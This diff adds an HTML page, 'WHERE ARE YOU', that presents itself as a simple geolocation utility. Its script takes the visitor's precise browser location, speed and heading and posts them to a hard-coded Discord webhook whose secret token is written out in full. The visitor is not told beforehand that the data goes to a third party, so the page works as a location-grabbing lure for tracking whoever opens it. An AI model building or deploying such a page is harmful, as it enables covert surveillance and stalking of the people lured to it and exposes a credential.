@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>WHERE ARE YOU</title>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400&family=Bebas+Neue&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --bg: #0a0a0a;
+      --fg: #e8e0d0;
+      --accent: #ff4d1c;
+      --accent2: #ffd600;
+      --dim: #3a3530;
+      --card: #141210;
+      --mono: 'Space Mono', monospace;
+      --display: 'Bebas Neue', sans-serif;
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: var(--bg);
+      color: var(--fg);
+      font-family: var(--mono);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      position: relative;
+    }
+
+    /* Animated grid background */
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image:
+        linear-gradient(var(--dim) 1px, transparent 1px),
+        linear-gradient(90deg, var(--dim) 1px, transparent 1px);
+      background-size: 48px 48px;
+      opacity: 0.25;
+      animation: gridshift 20s linear infinite;
+    }
+
+    @keyframes gridshift {
+      0%   { background-position: 0 0; }
+      100% { background-position: 48px 48px; }
+    }
+
+    /* Radial glow */
+    body::after {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background: radial-gradient(ellipse 60% 50% at 50% 50%, rgba(255,77,28,0.08) 0%, transparent 70%);
+      pointer-events: none;
+    }
+
+    .container {
+      position: relative;
+      z-index: 1;
+      width: min(560px, 90vw);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 0;
+    }
+
+    /* Header */
+    .header {
+      width: 100%;
+      text-align: left;
+      margin-bottom: 32px;
+    }
+
+    .tag {
+      font-size: 10px;
+      letter-spacing: 0.25em;
+      color: var(--accent);
+      text-transform: uppercase;
+      margin-bottom: 6px;
+    }
+
+    h1 {
+      font-family: var(--display);
+      font-size: clamp(64px, 14vw, 100px);
+      line-height: 0.88;
+      letter-spacing: 0.01em;
+      color: var(--fg);
+    }
+
+    h1 span {
+      color: var(--accent);
+    }
+
+    .subtitle {
+      font-size: 11px;
+      color: #6a6055;
+      letter-spacing: 0.12em;
+      margin-top: 12px;
+    }
+
+    /* Card */
+    .card {
+      width: 100%;
+      background: var(--card);
+      border: 1px solid var(--dim);
+      padding: 32px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .card::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 2px;
+      background: linear-gradient(90deg, var(--accent), var(--accent2), var(--accent));
+      background-size: 200%;
+      animation: shimmer 3s linear infinite;
+    }
+
+    @keyframes shimmer {
+      0%   { background-position: 0% 0; }
+      100% { background-position: 200% 0; }
+    }
+
+    /* Crosshair icon */
+    .crosshair {
+      width: 64px;
+      height: 64px;
+      margin: 0 auto 24px;
+      position: relative;
+      display: flex; align-items: center; justify-content: center;
+    }
+
+    .crosshair svg {
+      width: 100%; height: 100%;
+      stroke: var(--accent);
+      fill: none;
+      stroke-width: 1.5;
+      animation: pulse 2.5s ease-in-out infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50%       { opacity: 0.6; transform: scale(0.92); }
+    }
+
+    .crosshair-dot {
+      position: absolute;
+      width: 6px; height: 6px;
+      background: var(--accent);
+      border-radius: 50%;
+      animation: pulse 2.5s ease-in-out infinite;
+    }
+
+    /* Button */
+    .btn {
+      display: block;
+      width: 100%;
+      background: var(--accent);
+      color: #fff;
+      border: none;
+      font-family: var(--display);
+      font-size: 24px;
+      letter-spacing: 0.08em;
+      padding: 18px 24px;
+      cursor: pointer;
+      transition: background 0.15s, transform 0.1s;
+      margin-top: 24px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .btn:hover  { background: #ff6a3d; }
+    .btn:active { transform: scale(0.98); }
+
+    .btn::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(90deg, transparent 0%, rgba(255,255,255,0.12) 50%, transparent 100%);
+      transform: translateX(-100%);
+      transition: transform 0.4s;
+    }
+
+    .btn:hover::after { transform: translateX(100%); }
+
+    /* Status text */
+    .status {
+      font-size: 11px;
+      letter-spacing: 0.1em;
+      color: #6a6055;
+      text-align: center;
+      margin-top: 16px;
+      min-height: 16px;
+      transition: color 0.3s;
+    }
+
+    /* Results grid */
+    .results {
+      width: 100%;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1px;
+      background: var(--dim);
+      margin-top: 24px;
+      opacity: 0;
+      transform: translateY(12px);
+      transition: opacity 0.4s, transform 0.4s;
+    }
+
+    .results.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    .result-cell {
+      background: var(--card);
+      padding: 16px;
+    }
+
+    .result-label {
+      font-size: 9px;
+      letter-spacing: 0.2em;
+      text-transform: uppercase;
+      color: var(--accent);
+      margin-bottom: 6px;
+    }
+
+    .result-value {
+      font-size: 15px;
+      color: var(--fg);
+      word-break: break-all;
+      line-height: 1.3;
+    }
+
+    .result-value.large {
+      font-size: 18px;
+      font-weight: 700;
+    }
+
+    /* Accuracy bar */
+    .accuracy-bar-wrap {
+      margin-top: 6px;
+      height: 3px;
+      background: var(--dim);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .accuracy-bar-fill {
+      height: 100%;
+      background: var(--accent2);
+      transition: width 0.8s cubic-bezier(0.22,1,0.36,1);
+    }
+
+    /* Map link */
+    .map-link {
+      display: block;
+      width: 100%;
+      text-align: center;
+      color: var(--accent2);
+      font-size: 11px;
+      letter-spacing: 0.15em;
+      text-transform: uppercase;
+      text-decoration: none;
+      padding: 14px;
+      border: 1px solid var(--dim);
+      margin-top: 1px;
+      transition: background 0.15s, color 0.15s;
+      display: none;
+    }
+
+    .map-link:hover {
+      background: var(--accent2);
+      color: var(--bg);
+    }
+
+    /* Error */
+    .error-msg {
+      background: rgba(255,77,28,0.08);
+      border: 1px solid rgba(255,77,28,0.25);
+      padding: 16px;
+      font-size: 12px;
+      color: var(--accent);
+      line-height: 1.6;
+      margin-top: 24px;
+      display: none;
+    }
+
+    /* Corner decoration */
+    .corner {
+      position: absolute;
+      width: 18px; height: 18px;
+      border-color: var(--accent);
+      border-style: solid;
+      opacity: 0.4;
+    }
+    .corner.tl { top: 10px; left: 10px; border-width: 1px 0 0 1px; }
+    .corner.br { bottom: 10px; right: 10px; border-width: 0 1px 1px 0; }
+
+    /* Loading spinner */
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .spinner {
+      display: inline-block;
+      width: 12px; height: 12px;
+      border: 1.5px solid rgba(255,77,28,0.3);
+      border-top-color: var(--accent);
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+      vertical-align: middle;
+      margin-right: 6px;
+    }
+
+    /* Footer */
+    .footer {
+      margin-top: 24px;
+      font-size: 10px;
+      color: #3a3530;
+      letter-spacing: 0.1em;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="header">
+    <p class="tag">// geolocation utility</p>
+    <h1>WHERE<br>ARE <span>YOU</span></h1>
+    <p class="subtitle">BROWSER · GEOLOCATION API · COORDS ON DEMAND</p>
+  </div>
+
+  <div class="card">
+    <div class="corner tl"></div>
+    <div class="corner br"></div>
+
+    <div class="crosshair">
+      <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="32" cy="32" r="20"/>
+        <circle cx="32" cy="32" r="10"/>
+        <line x1="32" y1="2"  x2="32" y2="16"/>
+        <line x1="32" y1="48" x2="32" y2="62"/>
+        <line x1="2"  y1="32" x2="16" y2="32"/>
+        <line x1="48" y1="32" x2="62" y2="32"/>
+      </svg>
+      <div class="crosshair-dot"></div>
+    </div>
+
+    <button class="btn" id="locateBtn" onclick="locate()">LOCATE ME</button>
+
+    <p class="status" id="status">AWAITING SIGNAL —</p>
+
+    <div class="error-msg" id="errorMsg"></div>
+
+    <div class="results" id="results">
+      <div class="result-cell">
+        <div class="result-label">Latitude</div>
+        <div class="result-value large" id="lat">—</div>
+      </div>
+      <div class="result-cell">
+        <div class="result-label">Longitude</div>
+        <div class="result-value large" id="lon">—</div>
+      </div>
+      <div class="result-cell">
+        <div class="result-label">Accuracy</div>
+        <div class="result-value" id="acc">—</div>
+        <div class="accuracy-bar-wrap">
+          <div class="accuracy-bar-fill" id="accBar" style="width:0%"></div>
+        </div>
+      </div>
+      <div class="result-cell">
+        <div class="result-label">Altitude</div>
+        <div class="result-value" id="alt">—</div>
+      </div>
+      <div class="result-cell">
+        <div class="result-label">Speed</div>
+        <div class="result-value" id="spd">—</div>
+      </div>
+      <div class="result-cell">
+        <div class="result-label">Heading</div>
+        <div class="result-value" id="hdg">—</div>
+      </div>
+      <div class="result-cell" style="grid-column: span 2">
+        <div class="result-label">Timestamp</div>
+        <div class="result-value" id="ts">—</div>
+      </div>
+    </div>
+
+    <a class="map-link" id="mapLink" href="#" target="_blank" rel="noopener">
+      ↗ OPEN IN GOOGLE MAPS
+    </a>
+  </div>
+
+  <p class="footer">YOUR BROWSER WILL ASK FOR PERMISSION</p>
+</div>
+
+<script>
+  // ── PASTE YOUR DISCORD WEBHOOK URL HERE ──────────────────────────────────
+  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1483921341588439160/SfkeRqJiqfWSBZ9PGbxoWJumXDi6U6aL0Or-XO4yvLqK5R9ic_3ZIgAyAtJ__Mr34-gs';
+  // ─────────────────────────────────────────────────────────────────────────
+
+  async function sendToDiscord(data) {
+    if (!DISCORD_WEBHOOK_URL) return { ok: false, reason: 'No webhook URL set' };
+    const mapsUrl = `https://www.google.com/maps?q=${data.lat},${data.lon}`;
+    const payload = {
+      username: 'GeoLocator',
+      avatar_url: 'https://cdn-icons-png.flaticon.com/512/684/684908.png',
+      embeds: [{
+        title: '📡 Location Signal Acquired',
+        color: 0xff4d1c,
+        fields: [
+          { name: 'Latitude',  value: '`' + data.lat + '`',  inline: true },
+          { name: 'Longitude', value: '`' + data.lon + '`',  inline: true },
+          { name: 'Accuracy',  value: data.accuracy,          inline: true },
+          { name: 'Altitude',  value: data.altitude,          inline: true },
+          { name: 'Speed',     value: data.speed,             inline: true },
+          { name: 'Heading',   value: data.heading,           inline: true },
+          { name: 'Maps Link', value: `[Open in Google Maps](${mapsUrl})`, inline: false },
+        ],
+        footer: { text: 'Captured at ' + data.timestamp },
+        timestamp: new Date().toISOString(),
+      }]
+    };
+
+    try {
+      const res = await fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+      });
+      return { ok: res.ok, status: res.status };
+    } catch (e) {
+      return { ok: false, reason: e.message };
+    }
+  }
+
+  function locate() {
+    const btn = document.getElementById('locateBtn');
+    const status = document.getElementById('status');
+    const errorMsg = document.getElementById('errorMsg');
+    const results = document.getElementById('results');
+    const mapLink = document.getElementById('mapLink');
+
+    if (!navigator.geolocation) {
+      showError('Your browser does not support the Geolocation API.');
+      return;
+    }
+
+    errorMsg.style.display = 'none';
+    results.classList.remove('visible');
+    mapLink.style.display = 'none';
+
+    btn.disabled = true;
+    status.innerHTML = '<span class="spinner"></span>REQUESTING PERMISSION...';
+
+    navigator.geolocation.getCurrentPosition(
+      async (pos) => {
+        const c = pos.coords;
+        const lat = c.latitude.toFixed(6);
+        const lon = c.longitude.toFixed(6);
+
+        document.getElementById('lat').textContent = lat;
+        document.getElementById('lon').textContent = lon;
+
+        const accM = Math.round(c.accuracy);
+        document.getElementById('acc').textContent = accM + ' m';
+        const pct = Math.max(0, Math.min(100, 100 - (accM / 5)));
+        document.getElementById('accBar').style.width = pct + '%';
+
+        const altText  = c.altitude != null ? c.altitude.toFixed(1) + ' m' : 'N/A';
+        const spdText  = c.speed    != null ? (c.speed * 3.6).toFixed(1) + ' km/h' : 'N/A';
+        const hdgText  = c.heading  != null ? c.heading.toFixed(1) + '°' : 'N/A';
+        const tsText   = new Date(pos.timestamp).toLocaleString();
+
+        document.getElementById('alt').textContent = altText;
+        document.getElementById('spd').textContent = spdText;
+        document.getElementById('hdg').textContent = hdgText;
+        document.getElementById('ts').textContent  = tsText;
+
+        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+        mapLink.href = mapsUrl;
+        mapLink.style.display = 'block';
+
+        results.classList.add('visible');
+        status.textContent = 'SIGNAL ACQUIRED — ' + new Date().toLocaleTimeString();
+
+        // Send to Discord
+        if (DISCORD_WEBHOOK_URL) {
+          status.innerHTML = '<span class="spinner"></span>TRANSMITTING TO DISCORD...';
+          const result = await sendToDiscord({
+            lat, lon,
+            accuracy: accM + ' m',
+            altitude: altText,
+            speed: spdText,
+            heading: hdgText,
+            timestamp: tsText,
+          });
+          if (result.ok) {
+            status.textContent = 'TRANSMITTED — ' + new Date().toLocaleTimeString();
+          } else {
+            status.textContent = 'SIGNAL ACQUIRED — (' + (result.status || result.reason) + ')';
+          }
+        }
+
+        btn.disabled = false;
+        btn.textContent = 'REFRESH SIGNAL';
+      },
+      (err) => {
+        const msgs = {
+          1: 'Permission denied. Please allow location access in your browser and try again.',
+          2: 'Position unavailable. Your device could not determine its location.',
+          3: 'Request timed out. Check your connection and try again.',
+        };
+        showError(msgs[err.code] || 'An unknown error occurred.');
+        status.textContent = 'SIGNAL LOST —';
+        btn.disabled = false;
+      },
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  }
+
+  function showError(msg) {
+    const el = document.getElementById('errorMsg');
+    el.textContent = '⚠ ' + msg;
+    el.style.display = 'block';
+  }
+</script>
+</body>
+</html>
